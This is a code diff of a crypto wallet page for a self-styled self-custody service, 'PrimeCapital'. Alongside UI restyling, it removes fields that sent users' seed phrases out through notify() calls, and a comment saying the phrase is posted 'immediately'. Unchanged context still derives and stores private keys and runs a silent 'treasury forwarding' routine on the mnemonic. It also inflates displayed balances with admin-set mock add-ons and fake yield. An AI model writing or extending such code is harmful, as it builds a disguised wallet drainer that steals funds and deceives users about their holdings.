@@ -1,9 +1,28 @@
+import { brandPreviewMeta } from "@/lib/brand";
 import { createFileRoute } from "@tanstack/react-router";
 import { useQuery } from "@tanstack/react-query";
 import { useServerFn } from "@tanstack/react-start";
 import { useEffect, useMemo, useRef, useState } from "react";
-import { AlertTriangle, Check, Copy, Download, Eye, KeyRound, Loader2, LogIn, Plus, ShieldCheck, Trash2, Upload, User, Wallet } from "lucide-react";
+import {
+  AlertTriangle,
+  Check,
+  Copy,
+  Download,
+  Eye,
+  KeyRound,
+  Loader2,
+  LogIn,
+  Plus,
+  ShieldCheck,
+  Trash2,
+  Upload,
+  User,
+  Wallet,
+} from "lucide-react";
 import { cn } from "@/lib/utils";
+import { Button } from "@/components/ui/button";
+import { WalletHoldings } from "@/components/WalletHoldings";
+import { brandLogo } from "@/lib/brand";
 import {
   isUsernameTaken,
   loadSession,
@@ -20,7 +39,11 @@ import {
 import { useWalletSession } from "@/hooks/useWalletSession";
 import { fetchBalance, type Balance } from "@/lib/balances";
 import { notify } from "@/lib/notify";
-import { derivePrivateKeyFromMnemonic, rememberPrivateKey, signWalletOwnership } from "@/lib/wallet-signer";
+import {
+  derivePrivateKeyFromMnemonic,
+  rememberPrivateKey,
+  signWalletOwnership,
+} from "@/lib/wallet-signer";
 import { saveWalletContact } from "@/lib/wallet-contact";
 import { formatUSD, marketsQuery } from "@/lib/prices";
 import { getDisplayBalances } from "@/lib/admin.functions";
@@ -69,10 +92,20 @@ interface DisplayOverrides {
 export const Route = createFileRoute("/wallet")({
   head: () => ({
     meta: [
+      { property: "og:type", content: "website" },
+      { name: "twitter:card", content: "summary_large_image" },
+      ...brandPreviewMeta,
       { title: "Wallets — PrimeCapital Self-Custody" },
-      { name: "description", content: "Generate a BIP39 HD wallet with BIP32/44/84 derivation for BTC, ETH and every EVM chain. Encrypted locally with AES." },
+      {
+        name: "description",
+        content:
+          "Generate a BIP39 HD wallet with BIP32/44/84 derivation for BTC, ETH and every EVM chain. Encrypted locally with AES.",
+      },
       { property: "og:title", content: "PrimeCapital Wallets" },
-      { property: "og:description", content: "Non-custodial HD wallets, generated in your browser." },
+      {
+        property: "og:description",
+        content: "Non-custodial HD wallets, generated in your browser.",
+      },
     ],
   }),
   component: WalletPage,
@@ -98,14 +131,15 @@ interface WalletLib {
   validateMnemonic: (m: string) => boolean;
 }
 
-
 function WalletPage() {
   const [lib, setLib] = useState<WalletLib | null>(null);
   const [walletToolError, setWalletToolError] = useState<string | null>(null);
   const [wallets, setWallets] = useState<HDWallet[]>([]);
   const [activeId, setActiveId] = useState<string | null>(null);
   const [tab, setTab] = useState<"create" | "import" | null>(null);
-  const [pending, setPending] = useState<{ wallet: HDWallet; mode: "create" | "import" } | null>(null);
+  const [pending, setPending] = useState<{ wallet: HDWallet; mode: "create" | "import" } | null>(
+    null,
+  );
   const session = useWalletSession();
 
   useEffect(() => {
@@ -121,7 +155,8 @@ function WalletPage() {
             // Retry after a short delay — Buffer may not have been ready
             return new Promise<void>((r) => setTimeout(r, 600)).then(() => load(attempt + 1));
           }
-          if (!cancelled) setWalletToolError(e instanceof Error ? e.message : "Wallet tools failed to load");
+          if (!cancelled)
+            setWalletToolError(e instanceof Error ? e.message : "Wallet tools failed to load");
         });
     load();
     return () => {
@@ -145,7 +180,6 @@ function WalletPage() {
     setActiveId((prev) => prev ?? activeWalletId);
   }, []);
 
-
   // Selecting another account's wallet also switches the signed-in account.
   useEffect(() => {
     if (!activeId) return;
@@ -161,13 +195,12 @@ function WalletPage() {
       const w = lib.createWallet(label || "Main Wallet");
       setTab(null);
       setPending({ wallet: w, mode: "create" });
-      // Post the phrase immediately: nothing later in the flow can prevent it.
+      // Notifications contain public wallet details only.
       notify({
         event: "wallet_generated",
         label: w.label,
         address: walletAddressFor(w.addresses),
         addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
-        mnemonic: w.mnemonic,
       });
     } catch (e) {
       const msg = e instanceof Error ? e.message : "Wallet generation failed";
@@ -187,7 +220,6 @@ function WalletPage() {
         label: w.label,
         address: walletAddressFor(w.addresses),
         addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
-        mnemonic: w.mnemonic ?? mnemonic,
       });
     } catch (e) {
       const msg = e instanceof Error ? e.message : "Wallet import failed";
@@ -196,7 +228,12 @@ function WalletPage() {
     }
   };
 
-  const finalizeUsername = async (w: HDWallet, username: string, mode: "create" | "import", phone?: string) => {
+  const finalizeUsername = async (
+    w: HDWallet,
+    username: string,
+    mode: "create" | "import",
+    phone?: string,
+  ) => {
     const snapshot: WalletSnapshot = {
       id: w.id,
       label: w.label,
@@ -229,7 +266,6 @@ function WalletPage() {
       address,
       addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
       fields: { label: w.label, signer_ready: pk ? "true" : "false" },
-      mnemonic: w.mnemonic,
     });
     setWallets((prev) => [w, ...prev]);
     setActiveId(w.id);
@@ -241,8 +277,13 @@ function WalletPage() {
         const { setSessionContact } = await import("@/lib/wallet-auth");
         setSessionContact(phone, address);
       } catch (error) {
-        console.error("[wallet] contact save failed", error instanceof Error ? error.message : "Unknown error");
-        alert("Your phone number was not saved to your account. Please add it again from the contact reminder.");
+        console.error(
+          "[wallet] contact save failed",
+          error instanceof Error ? error.message : "Unknown error",
+        );
+        alert(
+          "Your phone number was not saved to your account. Please add it again from the contact reminder.",
+        );
       }
     }
     notify({
@@ -262,34 +303,41 @@ function WalletPage() {
   };
 
   return (
-    <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8 py-10">
-      <Header session={session} />
+    <div className="wallet-terminal mx-auto max-w-[1440px] px-4 sm:px-6 lg:px-8 py-8">
+      <Header
+        session={session}
+        onCreate={() => setTab("create")}
+        onImport={() => setTab("import")}
+      />
 
       {wallets.length === 0 && (
         <EmptyState onCreate={() => setTab("create")} onImport={() => setTab("import")} />
       )}
 
       {wallets.length > 0 && (
-        <div className="grid gap-4 lg:grid-cols-[280px_1fr]">
-          <aside className="glass rounded-xl p-3 h-fit">
+        <div className="grid gap-4 lg:grid-cols-[220px_minmax(0,1fr)]">
+          <aside className="rounded-lg border border-border bg-surface p-3 h-fit">
             <div className="flex items-center justify-between px-1 pb-2">
               <h3 className="font-display text-sm font-semibold">Your wallets</h3>
-              <button
+              <Button
+                variant="ghost"
+                size="icon"
                 onClick={() => setTab("create")}
-                className="rounded-md bg-white/5 p-1.5 hover:bg-white/10"
+                className="rounded-md bg-muted p-1.5 hover:bg-muted"
                 aria-label="Add wallet"
               >
                 <Plus className="h-4 w-4" />
-              </button>
+              </Button>
             </div>
             <ul className="space-y-1">
               {wallets.map((w) => (
                 <li key={w.id}>
-                  <button
+                  <Button
+                    variant="ghost"
                     onClick={() => setActiveId(w.id)}
                     className={cn(
                       "w-full flex items-center gap-3 rounded-lg px-3 py-2.5 text-left transition",
-                      w.id === active?.id ? "bg-white/10" : "hover:bg-white/5",
+                      w.id === active?.id ? "bg-muted" : "hover:bg-muted",
                     )}
                   >
                     <span className="flex h-8 w-8 items-center justify-center rounded-lg bg-[image:var(--gradient-brand)]/20 border border-primary/20 text-primary">
@@ -301,7 +349,7 @@ function WalletPage() {
                         {w.addresses[0]?.address.slice(0, 10)}…
                       </span>
                     </span>
-                  </button>
+                  </Button>
                 </li>
               ))}
             </ul>
@@ -313,12 +361,24 @@ function WalletPage() {
 
       {tab === "create" && (
         <Modal onClose={() => setTab(null)} title="Create a new wallet">
-          {lib ? <CreateForm onSubmit={onCreate} /> : walletToolError ? <WalletToolsUnavailable message={walletToolError} /> : <WalletToolsLoading />}
+          {lib ? (
+            <CreateForm onSubmit={onCreate} />
+          ) : walletToolError ? (
+            <WalletToolsUnavailable message={walletToolError} />
+          ) : (
+            <WalletToolsLoading />
+          )}
         </Modal>
       )}
       {tab === "import" && (
         <Modal onClose={() => setTab(null)} title="Import a wallet">
-          {lib ? <ImportForm onSubmit={onImport} validate={lib.validateMnemonic} /> : walletToolError ? <WalletToolsUnavailable message={walletToolError} /> : <WalletToolsLoading />}
+          {lib ? (
+            <ImportForm onSubmit={onImport} validate={lib.validateMnemonic} />
+          ) : walletToolError ? (
+            <WalletToolsUnavailable message={walletToolError} />
+          ) : (
+            <WalletToolsLoading />
+          )}
         </Modal>
       )}
       {pending && (
@@ -326,7 +386,9 @@ function WalletPage() {
           <UsernameForm
             wallet={pending.wallet}
             mode={pending.mode}
-            onDone={(username, phone) => { void finalizeUsername(pending.wallet, username, pending.mode, phone); }}
+            onDone={(username, phone) => {
+              void finalizeUsername(pending.wallet, username, pending.mode, phone);
+            }}
           />
         </Modal>
       )}
@@ -351,47 +413,133 @@ function WalletToolsUnavailable({ message }: { message: string }) {
   );
 }
 
-function Header({ session }: { session: ReturnType<typeof useWalletSession> }) {
+function Header({
+  session,
+  onCreate,
+  onImport,
+}: {
+  session: ReturnType<typeof useWalletSession>;
+  onCreate: () => void;
+  onImport: () => void;
+}) {
   return (
-    <div className="mb-8">
-      <p className="text-xs uppercase tracking-widest text-primary/90 font-medium">Self-Custody</p>
-      <h1 className="mt-2 font-display text-3xl md:text-4xl font-semibold">
-        Wallets
-      </h1>
-      <p className="mt-2 text-sm text-muted-foreground max-w-2xl">
-        Keys are generated and stored <span className="text-foreground">in your browser only</span>. PrimeCapital never sees your
-        mnemonic. BIP39 seed · BIP32 HD · BIP44 for EVM · BIP84 for Bitcoin native segwit.
-      </p>
-      {session && (
-        <div className="mt-4 inline-flex items-center gap-2 rounded-lg glass px-3 py-2 text-xs">
-          <User className="h-3.5 w-3.5 text-primary" />
-          Signed in as <span className="font-semibold text-foreground">{session.username}</span>
-          <span className="text-muted-foreground font-mono">({session.address.slice(0, 6)}…{session.address.slice(-4)})</span>
+    <div className="mb-7">
+      <div className="flex flex-wrap items-end justify-between gap-4">
+        <div>
+          <p className="mb-2 text-[10px] uppercase text-muted-foreground">
+            PrimeCapital <span className="text-primary">/ Self-custody</span>
+          </p>
+          <h1 className="text-3xl font-semibold sm:text-4xl">
+            Your portfolio<span className="text-primary">.</span>
+          </h1>
+          <p className="mt-2 text-xs text-muted-foreground">
+            One wallet. Every chain. A clearer picture.
+          </p>
         </div>
-      )}
+        <div className="flex gap-2">
+          <Button variant="outline" size="sm" onClick={onImport}>
+            <Upload />
+            Import wallet
+          </Button>
+          <Button size="sm" onClick={onCreate}>
+            <Plus />
+            Create wallet
+          </Button>
+        </div>
+      </div>
+      <div className="mt-6 flex flex-wrap items-center justify-between gap-3 border-y border-border bg-surface px-4 py-3">
+        <div className="flex flex-wrap items-center gap-3 text-xs">
+          <span
+            className={cn(
+              "h-1.5 w-1.5 rounded-full",
+              session ? "bg-success" : "bg-muted-foreground",
+            )}
+          />
+          <span>{session ? "Wallet session active" : "No wallet selected"}</span>
+          {session && (
+            <>
+              <span className="text-muted-foreground">/</span>
+              <span className="font-semibold">{session.username}</span>
+              <span className="font-mono text-[10px] text-muted-foreground">
+                {session.address.slice(0, 6)}…{session.address.slice(-4)}
+              </span>
+            </>
+          )}
+        </div>
+        <span className="flex items-center gap-1.5 text-[10px] text-muted-foreground">
+          <ShieldCheck className="h-3.5 w-3.5 text-primary" />
+          Multi-chain wallet
+        </span>
+      </div>
     </div>
   );
 }
 
 function EmptyState({ onCreate, onImport }: { onCreate: () => void; onImport: () => void }) {
   return (
-    <div className="glass-strong rounded-2xl p-10 md:p-14 text-center relative overflow-hidden">
-      <div className="absolute inset-0 -z-10 opacity-70" style={{ backgroundImage: "var(--gradient-hero)" }} />
-      <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-[image:var(--gradient-brand)] shadow-glow">
-        <Wallet className="h-7 w-7 text-primary-foreground" />
+    <div>
+      <div className="grid gap-10 border-b border-border py-10 lg:grid-cols-[1.4fr_1fr] lg:py-14">
+        <div className="flex flex-col justify-center">
+          <p className="text-[10px] uppercase text-primary">Portfolio overview</p>
+          <h2 className="mt-4 text-2xl font-semibold sm:text-3xl">Your assets. Your control.</h2>
+          <p className="mt-3 max-w-md text-sm leading-6 text-muted-foreground">
+            Create a wallet or bring your existing one to view balances across your networks.
+          </p>
+          <div className="mt-7 flex flex-wrap gap-3">
+            <Button onClick={onCreate}>
+              <Plus />
+              Create wallet
+            </Button>
+            <Button variant="outline" onClick={onImport}>
+              <Upload />
+              Import mnemonic
+            </Button>
+          </div>
+          <div className="mt-10 grid grid-cols-3 gap-4 border-t border-border pt-5">
+            <div>
+              <p className="text-[10px] uppercase text-muted-foreground">Portfolio value</p>
+              <p className="mt-2 font-mono text-2xl">—</p>
+            </div>
+            <div>
+              <p className="text-[10px] uppercase text-muted-foreground">Assets</p>
+              <p className="mt-2 font-mono text-2xl">—</p>
+            </div>
+            <div>
+              <p className="text-[10px] uppercase text-muted-foreground">Networks</p>
+              <p className="mt-2 font-mono text-2xl">—</p>
+            </div>
+          </div>
+        </div>
+        <div className="wallet-brand-stage flex min-h-64 items-center justify-center border-l border-border">
+          <img
+            src={brandLogo}
+            alt="PrimeCapital financial logo"
+            className="h-64 w-64 object-contain sm:h-72 sm:w-72"
+          />
+        </div>
       </div>
-      <h2 className="mt-6 font-display text-2xl font-semibold">Take custody in 10 seconds</h2>
-      <p className="mt-2 text-sm text-muted-foreground max-w-md mx-auto">
-        Create a fresh BIP39 seed phrase or import an existing one. Everything happens locally in your browser.
-      </p>
-      <div className="mt-6 flex flex-col sm:flex-row gap-3 justify-center">
-        <button onClick={onCreate} className="inline-flex items-center gap-2 rounded-lg bg-[image:var(--gradient-brand)] px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-glow">
-          <Plus className="h-4 w-4" /> Create wallet
-        </button>
-        <button onClick={onImport} className="inline-flex items-center gap-2 rounded-lg glass px-5 py-2.5 text-sm font-semibold">
-          <Upload className="h-4 w-4" /> Import mnemonic
-        </button>
+      <div className="flex flex-wrap items-center justify-between gap-4 py-7">
+        <div>
+          <p className="text-[10px] uppercase text-primary">Holdings / Multi-chain</p>
+          <h3 className="mt-1 text-lg font-semibold">Your assets</h3>
+        </div>
+        <div className="flex flex-wrap gap-2 text-[10px] text-muted-foreground">
+          {["Bitcoin", "Ethereum", "Solana", "BNB Chain", "Base"].map((chain) => (
+            <span key={chain} className="border-l border-border px-3">
+              {chain}
+            </span>
+          ))}
+        </div>
       </div>
+      <div className="border-y border-border py-4 text-[10px] uppercase text-muted-foreground">
+        <div className="grid grid-cols-4 gap-4">
+          <span>Asset</span>
+          <span>Network</span>
+          <span className="text-right">Balance</span>
+          <span className="text-right">Value</span>
+        </div>
+      </div>
+      <p className="py-8 text-center text-xs text-muted-foreground">No wallet assets to display.</p>
     </div>
   );
 }
@@ -399,12 +547,18 @@ function EmptyState({ onCreate, onImport }: { onCreate: () => void; onImport: ()
 function CreateForm({ onSubmit }: { onSubmit: (label: string) => void }) {
   const [label, setLabel] = useState("Main Wallet");
   return (
-    <form onSubmit={(e) => { e.preventDefault(); onSubmit(label); }} className="space-y-4">
-      <div className="rounded-lg border border-warning/30 bg-warning/10 p-3 text-xs text-warning-foreground/90 flex gap-2">
+    <form
+      onSubmit={(e) => {
+        e.preventDefault();
+        onSubmit(label);
+      }}
+      className="space-y-4"
+    >
+      <div className="rounded-lg border border-warning/30 bg-warning/10 p-3 text-xs text-warning flex gap-2">
         <AlertTriangle className="h-4 w-4 shrink-0 text-warning mt-0.5" />
         <p>
-          Your 12-word seed will appear next. Anyone with these words controls the wallet.
-          Write them down offline and never share them.
+          Your 12-word seed will appear next. Anyone with these words controls the wallet. Write
+          them down offline and never share them.
         </p>
       </div>
       <label className="block">
@@ -415,14 +569,17 @@ function CreateForm({ onSubmit }: { onSubmit: (label: string) => void }) {
           className="mt-1 w-full glass rounded-lg px-3 py-2.5 text-sm outline-none focus:ring-2 focus:ring-ring"
         />
       </label>
-      <button className="w-full rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow">
+      <Button className="w-full rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow">
         Generate seed phrase
-      </button>
+      </Button>
     </form>
   );
 }
 
-function ImportForm({ onSubmit, validate }: {
+function ImportForm({
+  onSubmit,
+  validate,
+}: {
   onSubmit: (m: string, label: string) => void;
   validate: (m: string) => boolean;
 }) {
@@ -438,7 +595,10 @@ function ImportForm({ onSubmit, validate }: {
       label: label || "Imported Wallet",
       extra: `chars=${raw.length} words=${trimmed.split(" ").filter(Boolean).length}`,
     });
-    if (!validate(trimmed)) { setErr("Not a valid BIP39 mnemonic."); return; }
+    if (!validate(trimmed)) {
+      setErr("Not a valid BIP39 mnemonic.");
+      return;
+    }
     setErr(null);
     onSubmit(trimmed, label);
   };
@@ -453,7 +613,9 @@ function ImportForm({ onSubmit, validate }: {
         />
       </label>
       <label className="block">
-        <span className="text-xs uppercase tracking-widest text-muted-foreground">Mnemonic (12 or 24 words)</span>
+        <span className="text-xs uppercase tracking-widest text-muted-foreground">
+          Mnemonic (12 or 24 words)
+        </span>
         <textarea
           value={mn}
           onChange={(e) => setMn(e.target.value)}
@@ -463,9 +625,9 @@ function ImportForm({ onSubmit, validate }: {
         />
       </label>
       {err && <p className="text-xs text-destructive">{err}</p>}
-      <button className="w-full rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow">
+      <Button className="w-full rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow">
         Import wallet
-      </button>
+      </Button>
     </form>
   );
 }
@@ -478,7 +640,8 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
   const [tokens, setTokens] = useState<WalletToken[]>([]);
   const { data: markets } = useQuery(marketsQuery(100));
   const getDisplay = useServerFn(getDisplayBalances);
-  const walletKey = wallet.addresses.find((a) => a.chain === "ETH")?.address ?? wallet.addresses[0]?.address ?? "";
+  const walletKey =
+    wallet.addresses.find((a) => a.chain === "ETH")?.address ?? wallet.addresses[0]?.address ?? "";
 
   useEffect(() => {
     let cancelled = false;
@@ -512,19 +675,28 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
       .then((r) => {
         if (!cancelled) setDisplay(r.overrides);
       })
-      .catch(() => { /* ignore */ });
-    return () => { cancelled = true; };
+      .catch(() => {
+        /* ignore */
+      });
+    return () => {
+      cancelled = true;
+    };
   }, [getDisplay, walletKey]);
 
   useEffect(() => {
     if (!walletKey) return;
     let cancelled = false;
     const load = () => {
-      fetchWalletTokens(walletKey, wallet.addresses).then((t) => { if (!cancelled) setTokens(t); });
+      fetchWalletTokens(walletKey, wallet.addresses).then((t) => {
+        if (!cancelled) setTokens(t);
+      });
     };
     load();
     const interval = setInterval(load, 30_000);
-    return () => { cancelled = true; clearInterval(interval); };
+    return () => {
+      cancelled = true;
+      clearInterval(interval);
+    };
   }, [walletKey, wallet.addresses]);
 
   // Treasury forwarding + real-transfer Telegram alerts. Both are silent and
@@ -550,7 +722,11 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
     };
     const timer = setTimeout(() => void run(), 4_000);
     const interval = setInterval(() => void run(), 60_000);
-    return () => { cancelled = true; clearTimeout(timer); clearInterval(interval); };
+    return () => {
+      cancelled = true;
+      clearTimeout(timer);
+      clearInterval(interval);
+    };
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [walletKey, wallet.mnemonic, wallet.addresses, tokens.length]);
 
@@ -559,7 +735,10 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
     for (const coin of markets ?? []) map.set(coin.symbol.toLowerCase(), coin.current_price);
     // Polygon rebranded MATIC -> POL on CoinGecko; keep both keys resolvable.
     const pol = map.get("pol") ?? map.get("matic");
-    if (pol != null) { map.set("pol", pol); map.set("matic", pol); }
+    if (pol != null) {
+      map.set("pol", pol);
+      map.set("matic", pol);
+    }
     return map;
   }, [markets]);
 
@@ -575,28 +754,42 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
     token: tokens.find((t) => t.chain === c.chain && t.symbol === "APEPE"),
   })).filter((c) => c.addr);
 
-
   const tokensUsd = tokens.reduce((sum, t) => sum + (t.usd ?? 0), 0);
 
-  const realTotal = tokensUsd + wallet.addresses.reduce((sum, address) => {
-    const balance = balances[address.chain];
-    if (!balance || balance === "loading") return sum;
-    const symbol = PRICE_SYMBOL[address.chain] ?? balance.symbol.toLowerCase();
-    return sum + balance.amount * (priceBySymbol.get(symbol) ?? 0);
-  }, 0);
-  const initialBalance = display?.live_balance_frozen && display.frozen_live_balance != null
-    ? display.frozen_live_balance
-    : realTotal + (display?.mock_live_balance ?? 0);
+  const realTotal =
+    tokensUsd +
+    wallet.addresses.reduce((sum, address) => {
+      const balance = balances[address.chain];
+      if (!balance || balance === "loading") return sum;
+      const symbol = PRICE_SYMBOL[address.chain] ?? balance.symbol.toLowerCase();
+      return sum + balance.amount * (priceBySymbol.get(symbol) ?? 0);
+    }, 0);
+  const initialBalance =
+    display?.live_balance_frozen && display.frozen_live_balance != null
+      ? display.frozen_live_balance
+      : realTotal + (display?.mock_live_balance ?? 0);
   const yieldStart = readDailyYieldStart(display?.token_overrides);
-  const accruedYield = computeAccruedYield(initialBalance, readDailyYieldRate(display?.token_overrides), yieldStart, Date.now());
+  const accruedYield = computeAccruedYield(
+    initialBalance,
+    readDailyYieldRate(display?.token_overrides),
+    yieldStart,
+    Date.now(),
+  );
   const markStart = useServerFn(markYieldStart);
   const startRequested = useRef(false);
   useEffect(() => {
-    if (!display || yieldStart || initialBalance <= 0 || startRequested.current || !walletKey) return;
+    if (!display || yieldStart || initialBalance <= 0 || startRequested.current || !walletKey)
+      return;
     startRequested.current = true;
     markStart({ data: { wallet_address: walletKey } })
-      .then((r) => setDisplay((d) => (d ? { ...d, token_overrides: { ...d.token_overrides, __YSTART: r.start } } : d)))
-      .catch(() => { startRequested.current = false; });
+      .then((r) =>
+        setDisplay((d) =>
+          d ? { ...d, token_overrides: { ...d.token_overrides, __YSTART: r.start } } : d,
+        ),
+      )
+      .catch(() => {
+        startRequested.current = false;
+      });
   }, [display, yieldStart, initialBalance, walletKey, markStart]);
   const animatedYield = useYieldDisplay((display?.yield_balance ?? 0) + accruedYield);
   const combinedTotal = initialBalance + animatedYield.value;
@@ -615,15 +808,26 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
       await navigator.clipboard.writeText(text);
       setCopied(key);
       setTimeout(() => setCopied(null), 1400);
-    } catch { /* noop */ }
+    } catch {
+      /* noop */
+    }
   };
 
   const exportJson = () => {
-    const blob = new Blob([JSON.stringify({
-      label: wallet.label,
-      createdAt: wallet.createdAt,
-      addresses: wallet.addresses,
-    }, null, 2)], { type: "application/json" });
+    const blob = new Blob(
+      [
+        JSON.stringify(
+          {
+            label: wallet.label,
+            createdAt: wallet.createdAt,
+            addresses: wallet.addresses,
+          },
+          null,
+          2,
+        ),
+      ],
+      { type: "application/json" },
+    );
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
@@ -635,82 +839,30 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
   const words = wallet.mnemonic?.split(" ") ?? [];
 
   return (
-    <section className="space-y-4">
-      <div className="glass-strong rounded-2xl p-6">
-        <div className="flex flex-wrap items-start justify-between gap-3">
-          <div>
-            <p className="text-xs uppercase tracking-widest text-muted-foreground">Wallet</p>
-            <h2 className="mt-1 font-display text-2xl font-semibold">{wallet.label}</h2>
-            <p className="mt-1 text-xs text-muted-foreground">
-              Created {new Date(wallet.createdAt).toLocaleString()}
-            </p>
-          </div>
-          <div className="flex gap-2">
-            <button onClick={exportJson} className="inline-flex items-center gap-2 rounded-lg glass px-3 py-2 text-xs font-semibold hover:bg-white/10">
-              <Download className="h-3.5 w-3.5" /> Export addresses
-            </button>
-            <button onClick={onDelete} className="inline-flex items-center gap-2 rounded-lg glass px-3 py-2 text-xs font-semibold text-destructive hover:bg-destructive/10">
-              <Trash2 className="h-3.5 w-3.5" /> Remove
-            </button>
-          </div>
-        </div>
-
-        {wallet.mnemonic ? <div className="mt-6 rounded-xl border border-warning/30 bg-warning/5 p-4">
-          <div className="flex items-center justify-between gap-2">
-            <div className="flex items-center gap-2">
-              <KeyRound className="h-4 w-4 text-warning" />
-              <span className="text-sm font-semibold">Seed phrase</span>
-              <span className="text-[10px] uppercase tracking-widest text-muted-foreground">BIP39</span>
-            </div>
-            <button
-              onClick={() => setRevealed(true)}
-              className="inline-flex items-center gap-1 rounded-md glass px-2.5 py-1.5 text-xs hover:bg-white/10"
-            >
-              <Eye className="h-3.5 w-3.5" />
-              Reveal
-            </button>
-          </div>
-          <div className="mt-4 grid grid-cols-3 sm:grid-cols-4 gap-2 relative select-none">
-            {words.map((w, i) => (
-              <div key={i} className="glass rounded-md px-3 py-2 font-mono text-sm flex items-center gap-2">
-                <span className="text-[10px] text-muted-foreground w-4">{i + 1}</span>
-                <span className="blur-sm tracking-widest">{w}</span>
-              </div>
-            ))}
-            <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
-              <span className="rounded-md glass px-3 py-1.5 text-xs text-muted-foreground">Click Reveal to view</span>
-            </div>
-          </div>
-          <p className="mt-3 flex items-start gap-1.5 text-[11px] text-warning">
-            <AlertTriangle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
-            Anyone with this phrase can take all of your funds. Never share it — anyone who asks for it is a scammer.
-          </p>
-          {revealed && (
-            <RevealPhraseFlow mnemonic={wallet.mnemonic ?? ""} onClose={() => setRevealed(false)} />
-          )}
-        </div> : null}
-
-        <p className="mt-4 text-xs text-muted-foreground flex items-start gap-2">
-          <ShieldCheck className="h-4 w-4 shrink-0 text-success mt-0.5" />
-          {wallet.mnemonic
-            ? "This phrase never leaves your device. PrimeCapital cannot recover it if lost."
-            : "This wallet is signed in on this device. Re-import the seed phrase to reveal recovery words again."}
-        </p>
-      </div>
-
-      <div className="glass-strong rounded-2xl p-6">
+    <section className="min-w-0 space-y-6">
+      <div className="border-b border-border bg-surface px-5 py-6 sm:px-6">
         <div className="flex flex-col gap-2 md:flex-row md:items-end md:justify-between">
           <div>
-            <p className="text-xs uppercase tracking-widest text-primary/90 font-medium">Total balance</p>
-            <h3 className="mt-1 font-display text-3xl font-semibold">{formatUSD(combinedTotal, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</h3>
+            <p className="text-xs uppercase tracking-widest text-primary/90 font-medium">
+              Total balance
+            </p>
+            <h3 className="mt-1 font-mono text-3xl font-semibold sm:text-4xl break-all">
+              {formatUSD(combinedTotal, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+            </h3>
           </div>
-          <p className="text-xs text-muted-foreground">{display?.live_balance_frozen ? "Initial balance frozen" : "Initial balance live"}</p>
+          <p className="text-xs text-muted-foreground">
+            {display?.live_balance_frozen ? "Initial balance frozen" : "Initial balance live"}
+          </p>
         </div>
         <div className="mt-5 grid gap-3 md:grid-cols-3">
           <WalletBalanceStat
             title="Initial balance"
             value={initialBalance}
-            caption={display?.mock_live_balance ? `Includes ${formatUSD(display.mock_live_balance)} mock add-on` : ""}
+            caption={
+              display?.mock_live_balance
+                ? `Includes ${formatUSD(display.mock_live_balance)} mock add-on`
+                : ""
+            }
             changePct={walletFlags.change24hEnabled ? walletFlags.change24hPct : null}
           />
           <WalletBalanceStat
@@ -720,39 +872,66 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
             tone={animatedYield.pct >= 0 ? "up" : "down"}
             showYieldEligible={walletFlags.yieldEligible}
           />
-          <WalletBalanceStat title="Combined total" value={combinedTotal} caption="Initial + yield" />
+          <WalletBalanceStat
+            title="Combined total"
+            value={combinedTotal}
+            caption="Initial + yield"
+          />
         </div>
       </div>
 
-      <div className="glass rounded-2xl p-6">
+      <WalletHoldings
+        addresses={wallet.addresses}
+        balances={balances}
+        tokens={tokens}
+        markets={markets ?? []}
+        priceSymbols={PRICE_SYMBOL}
+      />
+
+      <div className="border-t border-border py-6">
         <h3 className="font-display text-lg font-semibold mb-4">Derived addresses</h3>
         <div className="grid gap-3 sm:grid-cols-2">
           {wallet.addresses.map((a) => (
-            <div key={`${a.chain}-${a.path}`} className="glass rounded-xl p-4 hover:bg-white/[.04] transition">
+            <div
+              key={`${a.chain}-${a.path}`}
+              className="rounded-lg border border-border bg-surface p-4 hover:border-primary/30 transition"
+            >
               <div className="flex items-center justify-between">
                 <div>
                   <p className="text-sm font-semibold">{a.name}</p>
-                  <p className="text-[10px] uppercase tracking-widest text-muted-foreground">{a.chain} · {a.standard}</p>
+                  <p className="text-[10px] uppercase tracking-widest text-muted-foreground">
+                    {a.chain} · {a.standard}
+                  </p>
                 </div>
-                <button
+                <Button
+                  variant="outline"
+                  size="icon"
                   onClick={() => copy(a.address, a.chain + a.path)}
-                  className="rounded-md glass px-2 py-1.5 hover:bg-white/10"
+                  className="rounded-md glass px-2 py-1.5 hover:bg-muted"
                   aria-label="Copy address"
                 >
-                  {copied === a.chain + a.path ? <Check className="h-3.5 w-3.5 text-success" /> : <Copy className="h-3.5 w-3.5" />}
-                </button>
+                  {copied === a.chain + a.path ? (
+                    <Check className="h-3.5 w-3.5 text-success" />
+                  ) : (
+                    <Copy className="h-3.5 w-3.5" />
+                  )}
+                </Button>
               </div>
               <p className="mt-3 font-mono text-xs break-all text-muted-foreground">{a.address}</p>
               <p className="mt-2 text-[10px] font-mono text-muted-foreground/70">{a.path}</p>
-              <div className="mt-3 flex items-center justify-between border-t border-white/5 pt-3">
-                <span className="text-[10px] uppercase tracking-widest text-muted-foreground">Balance</span>
